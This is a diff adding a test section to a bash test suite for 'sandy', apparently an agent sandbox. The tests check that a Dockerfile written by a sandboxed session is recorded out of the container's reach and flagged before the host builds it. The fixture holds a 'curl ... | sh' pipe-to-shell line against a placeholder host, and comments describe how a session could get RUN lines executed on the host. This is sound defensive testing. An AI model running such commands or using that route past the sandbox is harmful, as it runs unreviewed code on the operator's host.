@@ -3120,6 +3120,8 @@ _PA_SCRIPT="$(cd "$(dirname "$0")/.." && pwd)/sandy"
 _PA_FN="$(awk '
     /^sha256\(\)/ {print; next}
     /^_sandy_context_hash\(\)/,/^}/ {print; next}
+    /^_sandy_df_session_record\(\)/,/^}/ {print; next}
+    /^_sandy_note_session_created_sandy_dir\(\)/,/^}/ {print; next}
     /^_sandy_project_dockerfile_approved\(\)/,/^}/ {print; next}
 ' "$_PA_SCRIPT")"
 # Compute the context hash exactly as sandy does (drift-proof — calls the real fn).
@@ -18392,6 +18394,8 @@ PY
 _S162_FN="$(awk '
     /^sha256\(\)/ {print; next}
     /^_sandy_context_hash\(\)/,/^}/ {print; next}
+    /^_sandy_df_session_record\(\)/,/^}/ {print; next}
+    /^_sandy_note_session_created_sandy_dir\(\)/,/^}/ {print; next}
     /^_sandy_project_dockerfile_approved\(\)/,/^}/ {print; next}
 ' "$_S162_SANDY")"
 _s162_mk() {   # $1 = fixture name; a workspace with a .sandy/Dockerfile and a stub docker
@@ -22583,6 +22587,8 @@ _S181_DIR="$(cd "$(mktemp -d)" && pwd -P)"
 _S181_FN="$(awk '
     /^sha256\(\)/ {print; next}
     /^_sandy_context_hash\(\)/,/^}/ {print; next}
+    /^_sandy_df_session_record\(\)/,/^}/ {print; next}
+    /^_sandy_note_session_created_sandy_dir\(\)/,/^}/ {print; next}
     /^_sandy_project_dockerfile_approved\(\)/,/^}/ {print; next}
 ' "$SANDY_SCRIPT")"
 cat > "$_S181_DIR/ptyyes.py" <<'PY'
@@ -22858,6 +22864,215 @@ unset _S185_D _S185_FN _S185_U _S185_OUT _S185_RC _S185_WARN _S185_FP _s185_args
 unset S185_DOCKER_LOG S185_SRC S185_EPOCH
 unset -f _s185_unit _s185_run _s185_end 2>/dev/null || true
 
+echo "§182: a .sandy/ a SESSION created is flagged at the next Dockerfile approval (#295 item 3)"
+# WHY. .sandy/ is protected against modification, not creation: it is mounted
+# :ro only when it existed at launch, so a session that started without one can
+# write .sandy/Dockerfile through the rw workspace bind -- and sandy is the one
+# that then offers to run its RUN lines on the host daemon, at the NEXT launch.
+# Maintainer decision (option C): keep the existence gate, but RECORD the
+# creation at session end, in a place neither the workspace nor the container
+# can reach, and have the next approval prompt say so ahead of every other
+# provenance line.
+#
+# Everything here runs the REAL code: the launch snapshot and the session-end
+# block are sliced out of sandy verbatim and run under set -euo pipefail (as
+# sandy itself is), and the gate is the real _sandy_project_dockerfile_approved.
+_S182_SANDY="$(cd "$(dirname "$0")/.." && pwd -P)/sandy"
+_S182_D="$(cd "$(mktemp -d)" && pwd -P)"
+python3 - "$_S182_SANDY" "$_S182_D" <<'S182_EXTRACT'
+import sys
+src = open(sys.argv[1]).read()
+out = sys.argv[2]
+lines = src.split('\n')
+def fn(name):
+    for i, l in enumerate(lines):
+        if l.startswith(name + '()'):
+            if l.rstrip().endswith('}'):
+                return l + '\n'
+            j = i
+            while lines[j] != '}':
+                j += 1
+            return '\n'.join(lines[i:j + 1]) + '\n'
+    raise SystemExit('missing function ' + name)
+names = ['sha256', 'info', '_sandy_protected_dirs', '_sandy_protected_files',
+         '_sandy_configured_hooks_rel', '_sandy_extra_hooks_dir', '_sandy_dir_is_inert_git',
+         '_sandy_context_hash', '_sandy_df_session_record', '_sandy_slug_for',
+         '_sandy_note_session_created_sandy_dir', '_sandy_project_dockerfile_approved']
+open(out + '/fns.sh', 'w').write(''.join(fn(n) for n in names))
+a = src.index(': > "$SANDBOX_DIR/.session-created-stubs"\n')
+b = src.index('done < <(_sandy_protected_files)\n', a) + len('done < <(_sandy_protected_files)\n')
+open(out + '/snap.sh', 'w').write(src[a:b])
+a = src.index('    # Detect protected-path appearances')
+b = src.index('    # #80: .git/HEAD is rw in-container', a)
+open(out + '/end.sh', 'w').write(src[a:b])
+S182_EXTRACT
+cat > "$_S182_D/drive.sh" <<'S182_DRIVE'
+set -euo pipefail
+S182_D="$1"; WORK_DIR="$2"; SANDBOX_DIR="$3"; SANDY_HOME="$4"; mode="$5"
+GREEN=""; YELLOW=""; NC=""
+. "$S182_D/fns.sh"
+if [ "$mode" = launch ]; then
+    RUN_FLAGS=(); SANDY_WORKSPACE=/ws
+    . "$S182_D/snap.sh"
+elif [ "$mode" = end ]; then
+    . "$S182_D/end.sh"
+else
+    SANDY_AUTO_APPROVE_PRIVILEGED=0
+    rc=0; _sandy_project_dockerfile_approved "$WORK_DIR/.sandy/Dockerfile" || rc=$?
+    echo "RC=$rc"
+fi
+S182_DRIVE
+cat > "$_S182_D/ptyans.py" <<'PY'
+import os, pty, sys, select, time, signal
+answer = sys.argv[1].encode()
+pid, fd = pty.fork()
+if pid == 0:
+    try:
+        os.execvp(sys.argv[2], sys.argv[2:])
+    finally:
+        os._exit(127)
+buf = b''
+sent = False
+deadline = time.time() + 60
+while time.time() < deadline:
+    r, _, _ = select.select([fd], [], [], 0.5)
+    if fd in r:
+        try:
+            d = os.read(fd, 4096)
+        except OSError:
+            break
+        if not d:
+            break
+        buf += d
+        if not sent and b'[y/N]' in buf:
+            os.write(fd, answer + b'\n')
+            sent = True
+else:
+    os.kill(pid, signal.SIGKILL)
+os.waitpid(pid, 0)
+sys.stdout.write(buf.decode('utf-8', 'replace'))
+PY
+_s182_mk() {   # $1 = fixture; a workspace with NO .sandy/, its sandbox dir and SANDY_HOME
+    mkdir -p "$_S182_D/$1/ws" "$_S182_D/$1/sb" "$_S182_D/$1/home"
+}
+_s182_run() {   # $1 = fixture  $2 = launch|end|gate  -> combined output
+    local T="$_S182_D/$1"
+    bash "$_S182_D/drive.sh" "$_S182_D" "$T/ws" "$T/sb" "$T/home" "$2" </dev/null 2>&1 || echo "DRIVE-FAILED"
+}
+_s182_pty() {   # $1 = fixture  $2 = answer; the gate on a pty -> its output
+    local T="$_S182_D/$1"
+    ( cd "$T/ws" && python3 "$_S182_D/ptyans.py" "$2" bash "$_S182_D/drive.sh" "$_S182_D" "$T/ws" "$T/sb" "$T/home" gate 2>&1 ) || true
+}
+_s182_rec() {   # $1 = fixture -> where the gate looks for the record
+    local T="$_S182_D/$1" wh
+    wh="$(printf '%s' "$T/ws" | { shasum -a 256 2>/dev/null || sha256sum; } | awk '{print $1}' | cut -c1-16)"
+    printf '%s' "$T/home/approvals/dockerfile-$wh.session-created"
+}
+_s182_approval() {   # $1 = fixture -> the approval file the record qualifies
+    local r
+    r="$(_s182_rec "$1")"
+    printf '%s' "${r%.session-created}.list"
+}
+_s182_hash() { bash -c ". '$_S182_D/fns.sh'"$'\n''_sandy_context_hash "$1"' _ "$1"; }
+_s182_df() { mkdir -p "$1/.sandy"; printf 'ARG BASE_IMAGE\nFROM $BASE_IMAGE\nRUN curl -s https://example.invalid/x | sh\n' > "$1/.sandy/Dockerfile"; }
+_s182_created() {   # $1 = fixture: launch without .sandy/, the session creates it, the session ends
+    _s182_mk "$1"
+    _S182_OUT="$(_s182_run "$1" launch)"
+    _s182_df "$_S182_D/$1/ws"
+    _S182_OUT="$(_s182_run "$1" end)"
+}
+
+check "§182(pre) sliced the launch snapshot, the session-end block and the gate out of sandy (mutation: a rename empties a slice and must fail HERE)" \
+    bash -c 'grep -q "protected-existed-at-launch" "$1/snap.sh" && grep -q "_sandy_note_session_created_sandy_dir" "$1/end.sh" && grep -q "^_sandy_project_dockerfile_approved()" "$1/fns.sh"' _ "$_S182_D"
+
+# --- A: the session that CREATES .sandy/ -------------------------------------
+_s182_created A
+_S182_HA="$(_s182_hash "$_S182_D/A/ws/.sandy")"
+check "§182(1) a .sandy/ absent at launch and present at session end is RECORDED, with the context hash as the session left it (mutation: dropping the cleanup call leaves no record)" \
+    bash -c 'test "$(head -n1 "$1" 2>/dev/null)" = "$2" && grep -q "^# by: *session-end$" "$1"' _ "$(_s182_rec A)" "$_S182_HA"
+check "§182(2) ...and the session-end warning says the next build will be flagged" \
+    bash -c 'printf "%s" "$1" | grep -q "Protected paths appeared" && printf "%s" "$1" | grep -q "flag it in the approval prompt as CREATED BY A SANDY SESSION" && ! printf "%s" "$1" | grep -q DRIVE-FAILED' _ "$_S182_OUT"
+check "§182(3) the record is OUTSIDE the workspace and OUTSIDE the sandbox dir -- the only trees a repository or the container can write -- and under SANDY_HOME/approvals (mutation: keeping it in SANDBOX_DIR makes it agent-forgeable)" \
+    bash -c 'r="$1"; [ "${r#"$2"/}" = "$r" ] && [ "${r#"$3"/}" = "$r" ] && [ "$(dirname "$r")" = "$4/approvals" ] && [ -f "$r" ]' \
+    _ "$(_s182_rec A)" "$_S182_D/A/ws" "$_S182_D/A/sb" "$_S182_D/A/home"
+
+# --- B: the prompt at the next launch ----------------------------------------
+_S182_OUT="$(_s182_run A gate)"
+_S182_DATE="$(sed -n 's/^# recorded: *//p' "$(_s182_rec A)")"
+check "§182(4) the next prompt says CREATED BY A SANDY SESSION with the recorded date, instead of \"NO prior approval\" (mutation: dropping the branch falls back to the weaker line)" \
+    bash -c '[ -n "$2" ] && printf "%s" "$1" | grep -qF "CREATED BY A SANDY SESSION (recorded $2)" && printf "%s" "$1" | grep -q "byte-for-byte" && ! printf "%s" "$1" | grep -q "NO prior approval"' _ "$_S182_OUT" "$_S182_DATE"
+check "§182(5) ...an unanswerable (no-tty) prompt still fails closed, and does NOT clear the record" \
+    bash -c 'printf "%s" "$1" | grep -q "RC=1" && [ -f "$2" ]' _ "$_S182_OUT" "$(_s182_rec A)"
+printf 'RUN true\n' >> "$_S182_D/A/ws/.sandy/Dockerfile"
+_S182_OUT="$(_s182_run A gate)"
+check "§182(6) content edited after the session ended is still flagged, and says it CHANGED since (mutation: matching on the hash alone would drop the flag for an agent file with one line touched)" \
+    bash -c 'printf "%s" "$1" | grep -q "CREATED BY A SANDY SESSION" && printf "%s" "$1" | grep -q "CHANGED since that session ended"' _ "$_S182_OUT"
+
+# --- C: a .sandy/ that EXISTED at launch is not a session's creation ----------
+_s182_mk B
+_s182_df "$_S182_D/B/ws"
+_S182_OUT="$(_s182_run B launch)"
+printf 'RUN echo edited\n' >> "$_S182_D/B/ws/.sandy/Dockerfile"
+_S182_OUT="$(_s182_run B end)"
+check "§182(7) a .sandy/ that existed at launch writes NO record (mutation: dropping the existed-at-launch test flags every operator-written Dockerfile)" \
+    bash -c '[ ! -e "$1" ] && ! printf "%s" "$2" | grep -q DRIVE-FAILED' _ "$(_s182_rec B)" "$_S182_OUT"
+_S182_OUT="$(_s182_run B gate)"
+check "§182(8) ...and its prompt keeps the ordinary provenance line" \
+    bash -c 'printf "%s" "$1" | grep -q "NO prior approval" && ! printf "%s" "$1" | grep -q "CREATED BY A SANDY SESSION"' _ "$_S182_OUT"
+_s182_mk C
+_S182_OUT="$(_s182_run C launch)"
+_S182_OUT="$(_s182_run C end)"
+check "§182(9) a session that never creates .sandy/ writes no record" \
+    test ! -e "$(_s182_rec C)"
+
+# --- D: when the record is cleared -- never silently --------------------------
+if command -v python3 >/dev/null 2>&1; then
+    _s182_created E
+    _S182_OUT="$(_s182_pty E y)"
+    check "§182(10) approving (y, on a tty) clears the record AND says so, and the approval keeps the provenance it was given over (mutation: not removing it re-flags reviewed content forever)" \
+        bash -c 'printf "%s" "$1" | grep -q "RC=0" && [ ! -e "$2" ] && printf "%s" "$1" | grep -q "flag is cleared" && grep -q "^# provenance: created by a sandy session" "$3"' _ "$_S182_OUT" "$(_s182_rec E)" "$(_s182_approval E)"
+    _s182_created F
+    _S182_OUT="$(_s182_pty F n)"
+    check "§182(11) declining (N) keeps the record, so the next prompt says the same thing" \
+        bash -c 'printf "%s" "$1" | grep -q "RC=1" && printf "%s" "$1" | grep -q "CREATED BY A SANDY SESSION" && [ -f "$2" ]' _ "$_S182_OUT" "$(_s182_rec F)"
+    # The --start pre-pass calls the same gate; drive the REAL pre-pass once,
+    # against a SANDY_HOME holding only the record the session-end block wrote.
+    mkdir -p "$_S182_D/F/bin" "$_S182_D/F/home2/approvals"
+    printf '#!/usr/bin/env bash\nexit 0\n' > "$_S182_D/F/bin/docker"; chmod +x "$_S182_D/F/bin/docker"
+    cp "$(_s182_rec F)" "$_S182_D/F/home2/approvals/"
+    _S182_OUT="$( (cd "$_S182_D/F/ws" && env -u SANDY_AUTO_APPROVE_PRIVILEGED PATH="$_S182_D/F/bin:$PATH" SANDY_HOME="$_S182_D/F/home2" HOME="$_S182_D/F" SANDY_APPROVE_ONLY=1 SANDY_APPROVE_ONLY_RESULT="$_S182_D/F/result" python3 "$_S182_D/ptyans.py" n bash "$_S182_SANDY" 2>&1) || true )"
+    check "§182(12) the REAL --start pre-pass shows the same CREATED BY A SANDY SESSION line on the client tty" \
+        bash -c 'printf "%s" "$1" | grep -q "CREATED BY A SANDY SESSION" && printf "%s" "$1" | grep -q "Build this .sandy/Dockerfile"' _ "$_S182_OUT"
+else
+    skip "§182(10-12) python3 not available to drive a pty"
+fi
+_s182_created G
+printf '%s\n# workspace: %s\n# approved:  2026-01-02T03:04:05Z\n' "$(_s182_hash "$_S182_D/G/ws/.sandy")" "$_S182_D/G/ws" > "$(_s182_approval G)"
+_S182_OUT="$(_s182_run G gate)"
+check "§182(13) content that matches an existing approval builds, and the stale record is cleared WITH a message (mutation: a silent rm, or none)" \
+    bash -c 'printf "%s" "$1" | grep -q "RC=0" && printf "%s" "$1" | grep -q "flag cleared" && [ ! -e "$2" ]' _ "$_S182_OUT" "$(_s182_rec G)"
+
+# --- E: a session whose cleanup never ran (SIGKILL, reboot, dead supervisor) --
+_s182_mk H
+_S182_OUT="$(_s182_run H launch)"
+_s182_df "$_S182_D/H/ws"
+# No "end" run: the snapshot is left behind, as a killed session leaves it.
+_S182_OUT="$(_s182_run H gate)"
+check "§182(14) the next launch's gate reads a snapshot left by a session that never cleaned up, and flags it (by: next-launch)" \
+    bash -c 'printf "%s" "$1" | grep -q "CREATED BY A SANDY SESSION" && grep -q "^# by: *next-launch$" "$2"' _ "$_S182_OUT" "$(_s182_rec H)"
+
+# --- F: --remove-sandbox reaps the record with the approval it qualifies ------
+_S182_SLUG="$(bash -c ". '$_S182_D/fns.sh'"$'\n''_sandy_slug_for "$1"' _ "$_S182_D/A/ws")"
+mkdir -p "$_S182_D/A/home/sandboxes/$_S182_SLUG" "$_S182_D/A/bin"
+printf '#!/usr/bin/env bash\nexit 0\n' > "$_S182_D/A/bin/docker"; chmod +x "$_S182_D/A/bin/docker"
+printf '{"workspace_path":"%s"}\n' "$_S182_D/A/ws" > "$_S182_D/A/home/sandboxes/$_S182_SLUG/WORKSPACE.json"
+( cd "$_S182_D/A/ws" && PATH="$_S182_D/A/bin:$PATH" SANDY_HOME="$_S182_D/A/home" HOME="$_S182_D/A" bash "$_S182_SANDY" --remove-sandbox --workspace "$_S182_D/A/ws" --yes </dev/null >/dev/null 2>&1 ) || true
+check "§182(15) --remove-sandbox removes the session-created record along with the sandbox" \
+    bash -c '[ ! -d "$1" ] && [ ! -e "$2" ]' _ "$_S182_D/A/home/sandboxes/$_S182_SLUG" "$(_s182_rec A)"
+
+rm -rf "$_S182_D"
+unset _S182_SANDY _S182_D _S182_OUT _S182_HA _S182_DATE _S182_SLUG
+unset -f _s182_mk _s182_run _s182_pty _s182_rec _s182_approval _s182_hash _s182_df _s182_created
 
 # BEGIN SUMMARY
 # ============================================================
